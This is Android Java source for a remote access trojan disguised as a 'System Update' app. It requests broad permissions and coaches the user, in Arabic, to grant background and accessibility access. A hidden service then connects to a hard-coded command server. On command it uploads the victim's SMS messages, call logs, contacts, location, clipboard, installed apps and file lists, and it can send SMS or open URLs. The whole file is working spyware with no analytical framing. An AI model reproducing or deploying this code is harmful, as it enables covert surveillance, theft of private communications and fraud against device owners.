package com.system.update;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import io.socket.client.IO;
import io.socket.client.Socket;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PERMS = 1001;
    private TextView statusText;
    private Button activateBtn;
    private LinearLayout layout;

    public static final String SERVER_URL = "https://devil-rat-production.up.railway.app";

    private final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        layout = findViewById(R.id.main_layout);
        statusText = findViewById(R.id.status_text);
        activateBtn = findViewById(R.id.activate_btn);
        activateBtn.setOnClickListener(v -> requestAllPermissions());
        addSettingsButtons();
    }

    private void addSettingsButtons() {
        if (layout == null) return;
        Button b1 = new Button(this);
        b1.setText("1. تعطيل تحسين البطارية");
        b1.setOnClickListener(v -> { try { Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS); i.setData(Uri.parse("package:" + getPackageName())); startActivity(i); } catch (Exception e) {} });
        layout.addView(b1);
        Button b2 = new Button(this);
        b2.setText("2. إذن العمل في الخلفية");
        b2.setOnClickListener(v -> { Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS); i.setData(Uri.parse("package:" + getPackageName())); startActivity(i); });
        layout.addView(b2);
        Button b3 = new Button(this);
        b3.setText("3. إعدادات إمكانية الوصول (مهم)");
        b3.setOnClickListener(v -> { Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS); startActivity(i); Toast.makeText(this, "فعّل System Update", Toast.LENGTH_LONG).show(); });
        layout.addView(b3);
    }

    private void requestAllPermissions() {
        List<String> m = new ArrayList<>();
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) m.add(p);
        }
        if (!m.isEmpty()) { ActivityCompat.requestPermissions(this, m.toArray(new String[0]), REQ_PERMS); return; }
        done();
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == REQ_PERMS) done();
    }

    private void done() {
        Toast.makeText(this, "✅ التطبيق يعمل في الخلفية", Toast.LENGTH_LONG).show();
        statusText.setText("✅ التطبيق يعمل في الخلفية");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(new Intent(this, SocketService.class));
        else startService(new Intent(this, SocketService.class));
    }

    public static class SocketService extends Service {
        private Socket mSocket;
        private static final String CH_ID = "sys_update_ch";

        @Override
        public void onCreate() {
            super.onCreate();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(CH_ID, "System", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
            }
            Notification notif = new NotificationCompat.Builder(this, CH_ID)
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setContentTitle("System").setContentText("Running")
                    .setPriority(NotificationCompat.PRIORITY_MIN).setOngoing(true).build();
            startForeground(1, notif);
            connectToServer();
        }

        private void connectToServer() {
            try {
                IO.Options opts = new IO.Options();
                opts.extraHeaders = new HashMap<>();
                opts.extraHeaders.put("model", Collections.singletonList(Build.MODEL));
                opts.extraHeaders.put("version", Collections.singletonList(Build.VERSION.RELEASE));
                opts.extraHeaders.put("provider", Collections.singletonList("Unknown"));
                IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent bs = registerReceiver(null, f);
                int level = bs != null ? bs.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
                int scale = bs != null ? bs.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
                opts.extraHeaders.put("battery", Collections.singletonList(((int)((level/(float)scale)*100)) + "%"));

                mSocket = IO.socket(MainActivity.SERVER_URL, opts);
                mSocket.on(Socket.EVENT_CONNECT, args -> {});
                mSocket.on(Socket.EVENT_DISCONNECT, args -> connectToServer());
                mSocket.on("commend", args -> {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String cmd = data.getString("request");
                        handleCommand(cmd, data);
                    } catch (Exception e) {}
                });
                mSocket.connect();
            } catch (URISyntaxException e) {}
        }

        private void handleCommand(String cmd, JSONObject fullData) {
            try {
                switch (cmd) {
                    case "vibrate": vibrate(); break;
                    case "apps": sendApps(); break;
                    case "device_info": sendDeviceInfo(); break;
                    case "calls": sendCalls(); break;
                    case "contacts": sendContacts(); break;
                    case "sms": sendSms(); break;
                    case "location": sendLocation(); break;
                    case "files": sendFiles(); break;
                    case "clipboard": sendClipboard(); break;
                    case "notification": showNotif("System", "تنبيه"); break;
                    case "toast": Toast.makeText(this, "رسالة", Toast.LENGTH_LONG).show(); break;
                    case "send_sms":
                        JSONArray ex = fullData.optJSONArray("extras");
                        if (ex != null && ex.length() >= 2) {
                            String phone = ex.optJSONObject(0).optString("value");
                            String msg = ex.optJSONObject(1).optString("value");
                            SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
                        }
                        break;
                    case "open_url":
                        JSONArray ex2 = fullData.optJSONArray("extras");
                        if (ex2 != null && ex2.length() > 0) {
                            String url = ex2.optJSONObject(0).optString("value");
                            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(i);
                        }
                        break;
                }
            } catch (Exception e) {}
        }

        private void vibrate() {
            Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
            else v.vibrate(1000);
        }

        private void sendApps() {
            try {
                JSONArray arr = new JSONArray();
                android.content.pm.PackageManager pm = getPackageManager();
                for (android.content.pm.ApplicationInfo a : pm.getInstalledApplications(0)) {
                    JSONObject o = new JSONObject();
                    o.put("appName", pm.getApplicationLabel(a).toString());
                    o.put("packageName", a.packageName);
                    arr.put(o);
                }
                mSocket.emit("commend", new JSONObject().put("type", "apps").put("data", arr.toString()));
            } catch (Exception e) {}
        }

        private void sendDeviceInfo() {
            try {
                JSONObject o = new JSONObject();
                o.put("model", Build.MODEL); o.put("version", Build.VERSION.RELEASE);
                o.put("sdk", Build.VERSION.SDK_INT); o.put("manufacturer", Build.MANUFACTURER);
                mSocket.emit("commend", new JSONObject().put("type", "device_info").put("data", o.toString()));
            } catch (Exception e) {}
        }

        private void sendCalls() {
            try {
                JSONArray arr = new JSONArray();
                Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                if (c != null) { int n = 0; while (c.moveToNext() && n < 100) {
                    JSONObject o = new JSONObject();
                    o.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    o.put("type", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    o.put("date", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    o.put("duration", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    arr.put(o); n++;
                } c.close(); }
                mSocket.emit("commend", new JSONObject().put("type", "calls").put("data", arr.toString()));
            } catch (Exception e) {}
        }

        private void sendContacts() {
            try {
                JSONArray arr = new JSONArray();
                Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                if (c != null) { while (c.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    o.put("phoneNumber", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    arr.put(o);
                } c.close(); }
                mSocket.emit("commend", new JSONObject().put("type", "contacts").put("data", arr.toString()));
            } catch (Exception e) {}
        }

        private void sendSms() {
            try {
                JSONArray arr = new JSONArray();
                Cursor c = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, "date DESC");
                if (c != null) { int n = 0; while (c.moveToNext() && n < 100) {
                    JSONObject o = new JSONObject();
                    o.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                    o.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                    o.put("date", c.getLong(c.getColumnIndexOrThrow("date")));
                    arr.put(o); n++;
                } c.close(); }
                mSocket.emit("commend", new JSONObject().put("type", "sms").put("data", arr.toString()));
            } catch (Exception e) {}
        }

        private void sendLocation() {
            try {
                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
                Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc != null) {
                    JSONObject o = new JSONObject();
                    o.put("lat", loc.getLatitude()); o.put("lon", loc.getLongitude());
                    mSocket.emit("commend", new JSONObject().put("type", "location").put("data", o.toString()));
                }
            } catch (Exception e) {}
        }

        private void sendFiles() {
            try {
                JSONArray arr = new JSONArray();
                File dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (dl.exists()) for (File f : dl.listFiles()) {
                    JSONObject o = new JSONObject();
                    o.put("name", f.getName()); o.put("path", f.getAbsolutePath()); o.put("size", f.length());
                    arr.put(o);
                }
                mSocket.emit("commend", new JSONObject().put("type", "files").put("data", arr.toString()));
            } catch (Exception e) {}
        }

        private void sendClipboard() {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                ClipData clip = cm.getPrimaryClip();
                String text = (clip != null && clip.getItemCount() > 0) ? clip.getItemAt(0).getText().toString() : "";
                mSocket.emit("commend", new JSONObject().put("type", "clipboard").put("data", text));
            } catch (Exception e) {}
        }

        private void showNotif(String title, String msg) {
            NotificationCompat.Builder b = new NotificationCompat.Builder(this, CH_ID)
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setContentTitle(title).setContentText(msg).setAutoCancel(true);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).notify((int) System.currentTimeMillis(), b.build());
        }

        @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
        @Nullable @Override public IBinder onBind(Intent intent) { return null; }
    }
                            }
